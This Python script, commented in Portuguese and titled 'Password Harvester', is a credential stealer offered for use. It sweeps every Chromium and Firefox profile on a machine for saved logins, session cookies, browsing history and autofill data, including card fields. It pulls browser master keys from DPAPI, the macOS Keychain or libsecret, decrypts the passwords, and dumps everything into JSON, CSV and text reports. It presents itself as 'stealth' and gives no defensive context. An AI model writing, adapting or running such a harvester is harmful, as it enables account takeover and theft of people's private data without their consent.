#!/usr/bin/env python3
"""
Password Harvester - Extractor de Credenciais Salvas
Extrai senhas de Chrome, Firefox, Brave, Edge, Opera
Modo: stealth, output profissional, JSON + CSV

Autor: Jarvis | Mestre: Ibatle
"""

import os
import sys
import json
import csv
import sqlite3
import shutil
import base64
import hashlib
import tempfile
import struct
import subprocess
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Banner
BANNER = r"""
    ____                          __               __
   / __ \____  ___  ________     / /_  ____ ______/ /_____  _____
  / /_/ / __ \/ _ \/ ___/ _ \   / __ \/ __ `/ ___/ //_/ _ \/ ___/
 / ____/ /_/ /  __/ /  /  __/  / / / / /_/ / /__/ ,< /  __/ /
/_/    \____/\___/_/   \___/  /_/ /_/\__,_/\___/_/|_|\___/_/

          [ Extrator de Credenciais Salvas v1.0 ]
                    [ Jarvis | Ibatle ]
"""

# Navegadores suportados
BROWSERS = {
    "chrome": {
        "name": "Google Chrome",
        "paths": {
            "win": ["Google", "Chrome", "User Data", "Default", "Login Data"],
            "darwin": ["Google", "Chrome", "Default", "Login Data"],
            "linux": ["google-chrome", "Default", "Login Data"],
        },
        "cookies": "Cookies",
        "history": "History",
    },
    "brave": {
        "name": "Brave Browser",
        "paths": {
            "win": ["BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"],
            "darwin": ["BraveSoftware", "Brave-Browser", "Default", "Login Data"],
            "linux": ["BraveSoftware", "Brave-Browser", "Default", "Login Data"],
        },
    },
    "edge": {
        "name": "Microsoft Edge",
        "paths": {
            "win": ["Microsoft", "Edge", "User Data", "Default", "Login Data"],
            "darwin": ["Microsoft Edge", "Default", "Login Data"],
            "linux": ["microsoft-edge", "Default", "Login Data"],
        },
    },
    "opera": {
        "name": "Opera",
        "paths": {
            "win": ["Opera Software", "Opera Stable", "Login Data"],
            "darwin": ["com.operasoftware.Opera", "Login Data"],
            "linux": ["opera", "Login Data"],
        },
    },
    "firefox": {
        "name": "Mozilla Firefox",
        "paths": {
            "win": ["Mozilla", "Firefox", "Profiles"],
            "darwin": ["Application Support", "Firefox", "Profiles"],
            "linux": [".mozilla", "firefox"],
        },
        "is_firefox": True,
    },
    "vivaldi": {
        "name": "Vivaldi",
        "paths": {
            "win": ["Vivaldi", "User Data", "Default", "Login Data"],
            "darwin": ["Vivaldi", "Default", "Login Data"],
            "linux": ["vivaldi", "Default", "Login Data"],
        },
    },
}


def get_platform():
    """Detecta plataforma"""
    if sys.platform == "win32":
        return "win"
    elif sys.platform == "darwin":
        return "darwin"
    return "linux"


def get_user_data_dir():
    """Retorna diretorio base de dados do usuario"""
    platform = get_platform()
    if platform == "win":
        return os.path.join(os.environ.get("LOCALAPPDATA", ""))
    elif platform == "darwin":
        return os.path.join(os.path.expanduser("~"), "Library", "Application Support")
    return os.path.join(os.path.expanduser("~"), ".config")


def get_profile_dir():
    """Retorna diretorio base de perfis"""
    platform = get_platform()
    if platform == "win":
        return os.path.join(os.environ.get("APPDATA", ""))
    elif platform == "darwin":
        return os.path.join(os.path.expanduser("~"), "Library", "Application Support")
    return os.path.join(os.path.expanduser("~"), ".config")


def get_browser_base_dir(browser_key, platform):
    """Retorna diretorio base do navegador (sem o Login Data)"""
    browser = BROWSERS[browser_key]
    if browser.get("is_firefox"):
        return None
    paths = browser["paths"].get(platform, browser["paths"].get("linux", []))
    # Remove o ultimo elemento (Login Data) para pegar o diretorio base
    base_paths = paths[:-1] if paths else []
    if platform == "win":
        return os.path.join(get_user_data_dir(), *base_paths)
    elif platform == "darwin":
        return os.path.join(get_user_data_dir(), *base_paths)
    return os.path.join(get_user_data_dir(), *base_paths)


def get_browser_path(browser_key, platform):
    """Constroi path completo para o banco de dados do navegador"""
    browser = BROWSERS[browser_key]
    if browser.get("is_firefox"):
        return None  # Firefox usa outro metodo

    paths = browser["paths"].get(platform, browser["paths"].get("linux", []))
    if platform == "win":
        return os.path.join(get_user_data_dir(), *paths)
    elif platform == "darwin":
        return os.path.join(get_user_data_dir(), *paths)
    return os.path.join(get_user_data_dir(), *paths)


def get_all_chromium_profiles(browser_key, platform):
    """Retorna todos os perfis do navegador (Default, Profile 1, 2, etc.)"""
    base_dir = get_browser_base_dir(browser_key, platform)
    if not base_dir or not os.path.exists(base_dir):
        return []

    profiles = []
    try:
        for item in os.listdir(base_dir):
            item_path = os.path.join(base_dir, item)
            if not os.path.isdir(item_path):
                continue
            # Check if profile has Login Data
            login_data = os.path.join(item_path, "Login Data")
            if os.path.exists(login_data):
                profiles.append({
                    "name": item,
                    "path": login_data,
                    "cookies": os.path.join(item_path, "Cookies") if os.path.exists(os.path.join(item_path, "Cookies")) else None,
                    "history": os.path.join(item_path, "History") if os.path.exists(os.path.join(item_path, "History")) else None,
                })
    except:
        pass

    return profiles


def get_firefox_profiles():
    """Retorna lista de perfis do Firefox"""
    platform = get_platform()
    if platform == "win":
        base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    elif platform == "darwin":
        base = os.path.join(os.path.expanduser("~"), "Library", "Application Support", "Firefox", "Profiles")
    else:
        base = os.path.join(os.path.expanduser("~"), ".mozilla", "firefox")

    if not os.path.exists(base):
        return []

    profiles = []
    for item in os.listdir(base):
        item_path = os.path.join(base, item)
        if os.path.isdir(item_path) and item.endswith(".default") or "default" in item:
            logins_file = os.path.join(item_path, "logins.json")
            if os.path.exists(logins_file):
                profiles.append({"name": item, "path": item_path, "logins": logins_file})
    return profiles


def get_chromium_logins(db_path):
    """Extrai credenciais de banco Chromium (Chrome, Brave, Edge, etc.)"""
    results = []
    if not os.path.exists(db_path):
        return results

    # Copia para temp para evitar lock
    temp_db = os.path.join(tempfile.gettempdir(), f"harvest_{os.path.basename(db_path)}")
    try:
        shutil.copy2(db_path, temp_db)
    except:
        return results

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT origin_url, username_value, password_value, date_created
            FROM logins
            WHERE username_value != ''
        """)

        for row in cursor.fetchall():
            origin_url, username, password_encrypted, date_created = row

            # Tentar decodificar password
            password = "[encrypted - needs decryption key]"
            if password_encrypted and len(password_encrypted) > 0:
                try:
                    # Chromium usa DPAPI no Windows, sem key fica cifrado
                    password = attempt_decrypt(password_encrypted)
                except:
                    pass

            results.append({
                "url": origin_url,
                "username": username,
                "password": password,
                "created": date_created,
                "browser": "chromium",
            })

        conn.close()
    except Exception as e:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass

    return results


def get_firefox_logins(profile_path, logins_file):
    """Extrai credenciais do Firefox"""
    results = []
    if not os.path.exists(logins_file):
        return results

    try:
        with open(logins_file, "r", encoding="utf-8") as f:
            data = json.load(f)

        logins = data.get("logins", [])
        for login in logins:
            hostname = login.get("hostname", "")
            username = login.get("encryptedUsername", "")
            password = login.get("encryptedPassword", "")
            time_created = login.get("timeCreated", 0)

            # Firefox usa criptografia com master password
            # Sem a chave, fica cifrado
            results.append({
                "url": hostname,
                "username": "[encrypted]" if username else "",
                "password": "[encrypted]" if password else "",
                "created": time_created,
                "browser": "firefox",
            })
    except:
        pass

    return results


def get_chromium_cookies(db_path):
    """Extrai cookies de banco Chromium"""
    results = []
    if not os.path.exists(db_path):
        return results

    cookies_db = os.path.join(os.path.dirname(db_path), "Cookies")
    if not os.path.exists(cookies_db):
        return results

    temp_db = os.path.join(tempfile.gettempdir(), f"cookies_{os.path.basename(cookies_db)}")
    try:
        shutil.copy2(cookies_db, temp_db)
    except:
        return results

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
            FROM cookies
            ORDER BY host_key
        """)

        for row in cursor.fetchall():
            host_key, name, value, path, expires_utc, is_secure, is_httponly = row
            results.append({
                "host": host_key,
                "name": name,
                "value": value,
                "path": path,
                "expires": expires_utc,
                "secure": bool(is_secure),
                "httponly": bool(is_httponly),
            })

        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass

    return results


def get_chromium_history(db_path):
    """Extrai historico de banco Chromium"""
    results = []
    if not os.path.exists(db_path):
        return results

    history_db = os.path.join(os.path.dirname(db_path), "History")
    if not os.path.exists(history_db):
        return results

    temp_db = os.path.join(tempfile.gettempdir(), f"hist_{os.path.basename(history_db)}")
    try:
        shutil.copy2(history_db, temp_db)
    except:
        return results

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 500
        """)

        for row in cursor.fetchall():
            url, title, visit_count, last_visit_time = row
            results.append({
                "url": url,
                "title": title,
                "visits": visit_count,
                "last_visit": last_visit_time,
            })

        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass

    return results


def get_chromium_key_linux():
    """Obtem a chave de criptografia do Chromium no Linux via libsecret"""
    try:
        # Tenta usar secret-tool para obter a chave
        result = subprocess.run(
            ["secret-tool", "search", "application", "chrome"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return result.stdout.strip().encode()
    except:
        pass

    # Fallback: tenta ler do arquivo de estado
    state_paths = [
        os.path.join(os.path.expanduser("~"), ".config", "google-chrome", "Default", "Local State"),
        os.path.join(os.path.expanduser("~"), ".config", "BraveSoftware", "Brave-Browser", "Default", "Local State"),
        os.path.join(os.path.expanduser("~"), ".config", "microsoft-edge", "Default", "Local State"),
    ]

    for state_path in state_paths:
        if os.path.exists(state_path):
            try:
                with open(state_path, "r", encoding="utf-8") as f:
                    state = json.load(f)
                encrypted_key = state.get("os_crypt", {}).get("encrypted_key", "")
                if encrypted_key:
                    key_data = base64.b64decode(encrypted_key)
                    # Remove o prefixo "DPAPI" (5 bytes)
                    if key_data.startswith(b"DPAPI"):
                        key_data = key_data[5:]
                    return key_data
            except:
                pass
    return None


def get_chromium_key_windows():
    """Obtem a chave de criptografia do Chromium no Windows via DPAPI"""
    try:
        import ctypes
        from ctypes import wintypes

        # CryptUnprotectData
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", wintypes.DWORD),
                ("pbData", wintypes.LPBYTE)
            ]

        # Ler Local State
        local_state_paths = [
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Local State"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Local State"),
        ]

        for local_state_path in local_state_paths:
            if os.path.exists(local_state_path):
                with open(local_state_path, "r", encoding="utf-8") as f:
                    state = json.load(f)
                encrypted_key = state.get("os_crypt", {}).get("encrypted_key", "")
                if encrypted_key:
                    key_data = base64.b64decode(encrypted_key)
                    if key_data.startswith(b"DPAPI"):
                        key_data = key_data[5:]

                    # Descriptografar com DPAPI
                    blob_in = DATA_BLOB(len(key_data), ctypes.cast(key_data, wintypes.LPBYTE))
                    blob_out = DATA_BLOB()

                    ctypes.windll.crypt32.CryptUnprotectData(
                        ctypes.byref(blob_in), None, None, None, None, 0,
                        ctypes.byref(blob_out)
                    )

                    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return decrypted
    except:
        pass
    return None


def get_chromium_key_macos():
    """Obtem a chave de criptografia do Chromium no macOS via Keychain"""
    try:
        # Tenta usar security para obter a chave
        result = subprocess.run(
            ["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return result.stdout.strip().encode()
    except:
        pass
    return None


def decrypt_chromium_password(encrypted_data, key=None):
    """Decripta senha do Chromium usando AES-GCM"""
    if not encrypted_data or len(encrypted_data) < 3:
        return ""

    # Sem chave, nao da pra decriptar
    if key is None:
        return "[encrypted - no key]"

    try:
        # Chromium usa AES-256-GCM
        # v10 ou v11 prefixo
        if encrypted_data.startswith(b"v10") or encrypted_data.startswith(b"v11"):
            encrypted_data = encrypted_data[3:]  # Remove prefixo

        if len(encrypted_data) < 12:
            return "[encrypted - invalid]"

        # Nonce (12 bytes) + ciphertext + tag (16 bytes)
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]

        if CRYPTO_AVAILABLE:
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
            return plaintext.decode("utf-8")
        else:
            return "[encrypted - install cryptography]"
    except:
        pass
    return "[encrypted]"


def get_chromium_key():
    """Obtem a chave de criptografia do Chromium para a plataforma atual"""
    platform = get_platform()
    if platform == "win":
        return get_chromium_key_windows()
    elif platform == "darwin":
        return get_chromium_key_macos()
    else:
        return get_chromium_key_linux()


def attempt_decrypt(encrypted_data):
    """Tenta decodificar dados criptografados"""
    if encrypted_data.startswith(b"v10") or encrypted_data.startswith(b"v11"):
        key = get_chromium_key()
        if key:
            return decrypt_chromium_password(encrypted_data, key)
        return "[encrypted - needs key]"
    try:
        text = encrypted_data.decode("utf-8")
        if text.isprintable():
            return text
    except:
        pass
    return "[encrypted]"


def dump_autofill_data(db_path):
    """Extrai dados de autofill (enderecos, cartoes, etc.)"""
    results = []
    if not os.path.exists(db_path):
        return results

    temp_db = os.path.join(tempfile.gettempdir(), f"autofill_{os.path.basename(db_path)}")
    try:
        shutil.copy2(db_path, temp_db)
    except:
        return results

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        # Autofill (enderecos)
        try:
            cursor.execute("""
                SELECT name, value, value_lower, date_created
                FROM autofill
                WHERE value != ''
            """)
            for row in cursor.fetchall():
                name, value, value_lower, date_created = row
                results.append({
                    "type": "autofill",
                    "field": name,
                    "value": value,
                    "created": date_created,
                })
        except:
            pass

        # Credit cards (Chrome 88+ moveu para Payments)
        try:
            cursor.execute("""
                SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
                FROM credit_cards
            """)
            for row in cursor.fetchall():
                name, exp_month, exp_year, card_enc = row
                results.append({
                    "type": "credit_card",
                    "name": name,
                    "exp_month": exp_month,
                    "exp_year": exp_year,
                    "card": "[encrypted]" if card_enc else "",
                })
        except:
            pass

        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass

    return results


def harvest_all():
    """Executa harvest completo em todos os navegadores"""
    print(BANNER)
    print("\n[*] Iniciando extracao de credenciais...")
    print(f"[*] Plataforma: {get_platform().upper()}")
    print(f"[*] Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 60)

    all_credentials = []
    all_cookies = []
    all_history = []
    all_autofill = []

    platform = get_platform()

    # Chromium-based browsers
    for browser_key in ["chrome", "brave", "edge", "opera", "vivaldi"]:
        browser_info = BROWSERS[browser_key]
        profiles = get_all_chromium_profiles(browser_key, platform)

        if profiles:
            print(f"\n[+] {browser_info['name']} encontrado ({len(profiles)} perfil(is))")
            for profile in profiles:
                db_path = profile["path"]
                profile_name = profile["name"]
                print(f"    |-> Perfil: {profile_name}")

                # Logins
                logins = get_chromium_logins(db_path)
                for cred in logins:
                    cred["browser"] = f"{browser_info['name']} ({profile_name})"
                all_credentials.extend(logins)
                print(f"    |    Logins: {len(logins)}")

                # Cookies
                if profile["cookies"]:
                    cookies = get_chromium_cookies(db_path)
                    for c in cookies:
                        c["browser"] = f"{browser_info['name']} ({profile_name})"
                    all_cookies.extend(cookies)
                    print(f"    |    Cookies: {len(cookies)}")

                # History
                if profile["history"]:
                    history = get_chromium_history(db_path)
                    for h in history:
                        h["browser"] = f"{browser_info['name']} ({profile_name})"
                    all_history.extend(history)
                    print(f"    |    History: {len(history)}")

                # Autofill
                autofill = dump_autofill_data(db_path)
                for a in autofill:
                    a["browser"] = f"{browser_info['name']} ({profile_name})"
                all_autofill.extend(autofill)
                print(f"    |    Autofill: {len(autofill)}")

    # Firefox
    firefox_profiles = get_firefox_profiles()
    if firefox_profiles:
        print(f"\n[+] Mozilla Firefox encontrado ({len(firefox_profiles)} perfil(is))")
        for profile in firefox_profiles:
            logins = get_firefox_logins(profile["path"], profile["logins"])
            for cred in logins:
                cred["browser"] = f"Firefox ({profile['name']})"
            all_credentials.extend(logins)
            print(f"    |-> Logins ({profile['name']}): {len(logins)}")

    # Summary
    print("\n" + "=" * 60)
    print("[*] RESUMO DA EXTRACAO")
    print("=" * 60)
    print(f"    Credenciais (logins): {len(all_credentials)}")
    print(f"    Cookies: {len(all_cookies)}")
    print(f"    URLs (historico): {len(all_history)}")
    print(f"    Autofill dados: {len(all_autofill)}")
    print("=" * 60)

    return {
        "credentials": all_credentials,
        "cookies": all_cookies,
        "history": all_history,
        "autofill": all_autofill,
        "timestamp": datetime.now().isoformat(),
        "platform": platform,
    }


def save_results(data, output_dir="outputs"):
    """Salva resultados em JSON, CSV e TXT"""
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = f"harvest_{timestamp}"

    # JSON
    json_path = os.path.join(output_dir, f"{base_name}.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    print(f"\n[+] JSON salvo: {json_path}")

    # CSV - Logins
    if data["credentials"]:
        csv_path = os.path.join(output_dir, f"{base_name}_logins.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["url", "username", "password", "browser", "created"])
            writer.writeheader()
            for cred in data["credentials"]:
                writer.writerow({
                    "url": cred.get("url", ""),
                    "username": cred.get("username", ""),
                    "password": cred.get("password", ""),
                    "browser": cred.get("browser", ""),
                    "created": cred.get("created", ""),
                })
        print(f"[+] CSV logins: {csv_path}")

    # CSV - Cookies
    if data["cookies"]:
        csv_path = os.path.join(output_dir, f"{base_name}_cookies.csv")
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["host", "name", "value", "path", "browser"])
            writer.writeheader()
            for c in data["cookies"]:
                writer.writerow({
                    "host": c.get("host", ""),
                    "name": c.get("name", ""),
                    "value": c.get("value", ""),
                    "path": c.get("path", ""),
                    "browser": c.get("browser", ""),
                })
        print(f"[+] CSV cookies: {csv_path}")

    # TXT - Relatorio
    txt_path = os.path.join(output_dir, f"{base_name}_report.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("PASSWORD HARVESTER - RELATORIO\n")
        f.write("=" * 60 + "\n")
        f.write(f"Timestamp: {data['timestamp']}\n")
        f.write(f"Plataforma: {data['platform']}\n")
        f.write("=" * 60 + "\n\n")

        f.write("CREDENCIAIS (Logins)\n")
        f.write("-" * 60 + "\n")
        for cred in data["credentials"]:
            f.write(f"URL: {cred.get('url', 'N/A')}\n")
            f.write(f"User: {cred.get('username', 'N/A')}\n")
            f.write(f"Pass: {cred.get('password', 'N/A')}\n")
            f.write(f"Browser: {cred.get('browser', 'N/A')}\n")
            f.write("-" * 60 + "\n")

    print(f"[+] TXT relatorio: {txt_path}")
    return json_path, txt_path


def main():
    """Entry point"""
    data = harvest_all()

    if data["credentials"] or data["cookies"] or data["history"] or data["autofill"]:
        save_results(data)
        print("\n[*] Extracao concluida com sucesso!")
    else:
        print("\n[-] Nenhum navegador encontrado ou dados vazios.")

    return data


if __name__ == "__main__":
    main()
